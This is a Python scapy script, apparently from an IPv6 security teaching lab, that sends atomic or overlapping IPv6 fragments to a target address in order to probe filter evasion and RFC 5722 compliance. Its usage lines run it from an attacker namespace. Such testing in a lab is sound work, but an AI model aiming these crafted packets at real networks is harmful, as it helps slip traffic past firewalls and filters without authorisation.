#!/usr/bin/env python3
"""03-fragmentation-abuse.py -- atomic and overlapping IPv6 fragments, via scapy.

The quick-iteration teaching version of tools/frag6 (the from-scratch
raw-socket C tool) - same two techniques, see its README and
deep-dive.md's Extension Headers / Attack Lab sections for background:

  atomic  - RFC 6946: a packet carrying a Fragment header that isn't
            actually fragmented (offset 0, M=0). Some stateless filters
            treat "has a fragment header" as unable to fully inspect,
            even though the packet is complete and parseable.
  overlap - RFC 5722: two fragments both claiming byte range
            [0, frag-size) - one decoy (M=1), one the real payload
            (M=0). A compliant stack must discard the whole reassembled
            datagram; a non-compliant one reveals which content wins.

Usage (run inside the attacker namespace):
    sudo ip netns exec v6lab-attacker python3 03-fragmentation-abuse.py \\
        --dst fd00:6:cafe::2 --mode atomic
    sudo ip netns exec v6lab-attacker python3 03-fragmentation-abuse.py \\
        --dst fd00:6:cafe::2 --mode overlap --frag-size 8
"""

import argparse
from scapy.all import IPv6, IPv6ExtHdrFragment, ICMPv6EchoRequest, send

parser = argparse.ArgumentParser(description="Send atomic or overlapping IPv6 fragments")
parser.add_argument("--dst", required=True)
parser.add_argument("--mode", choices=["atomic", "overlap"], required=True)
parser.add_argument("--frag-size", type=int, default=8,
                     help="overlap mode: decoy fragment size in bytes, multiple of 8 (default 8)")
parser.add_argument("--id", type=int, default=0x1337, help="fragment identification value")
args = parser.parse_args()

if args.frag_size % 8 != 0:
    parser.error("--frag-size must be a multiple of 8")

echo = ICMPv6EchoRequest(data=bytes(range(24)))

if args.mode == "atomic":
    pkt = IPv6(dst=args.dst) / IPv6ExtHdrFragment(nh=58, id=args.id, offset=0, m=0) / echo
    print(f"sending 1 atomic fragment to {args.dst} (id=0x{args.id:x})")
    send(pkt, verbose=False)
else:
    real_len = len(bytes(echo))
    decoy_len = min(args.frag_size, real_len)
    decoy = b"\x41" * decoy_len  # 'A' filler - obviously not the real content

    frag1 = IPv6(dst=args.dst) / IPv6ExtHdrFragment(nh=58, id=args.id, offset=0, m=1) / decoy
    frag2 = IPv6(dst=args.dst) / IPv6ExtHdrFragment(nh=58, id=args.id, offset=0, m=0) / echo

    print(f"fragment 1 (decoy): offset=0 M=1 {decoy_len} filler bytes")
    send(frag1, verbose=False)
    print(f"fragment 2 (real):  offset=0 M=0 {real_len} real bytes")
    send(frag2, verbose=False)
    print("\nboth claim offset 0 - RFC 5722 says a compliant stack discards")
    print("the whole datagram. anything delivered is worth investigating.")

print("\nsee tools/frag6 for the from-scratch raw-socket version of this same idea.")
